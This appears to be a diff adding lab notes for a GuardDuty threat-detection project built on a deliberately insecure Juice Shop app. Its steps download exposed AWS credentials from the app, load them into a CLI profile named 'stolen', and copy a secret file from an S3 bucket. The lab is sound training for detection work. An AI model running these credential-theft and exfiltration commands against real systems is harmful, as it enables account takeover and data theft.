@@ -1,0 +1,29 @@
+Stack Description:
+This template creates an insecure web app for project on threat detection and GuardDuty!
+
+bash 
+
+Set up environmental variable for CloudShell, remember the URL pointing to web app.
+export JUICESHOPURL="[JuiceShopURL]"
+
+Set up environmental variable. Replace the value from CloudFormation
+export JUICESHOPS3BUCKET="[TheSecureBucket]"
+
+Download and Display Credentials
+wget $JUICESHOPURL/assets/public/credentials.json
+ 
+Display credentials.
+cat credentials.json | jq
+
+Configure AWS CLI Profile
+aws configure set profile.stolen.region us-west-2
+aws configure set profile.stolen.aws_access_key_id `cat credentials.json | jq -r '.AccessKeyId'`
+aws configure set profile.stolen.aws_secret_access_key `cat credentials.json | jq -r '.SecretAccessKey'`
+aws configure set profile.stolen.aws_session_token `cat credentials.json | jq -r '.Token'`
+
+
+Copy the Secret File
+aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen
+
+View Secret File
+cat secret-information.txt
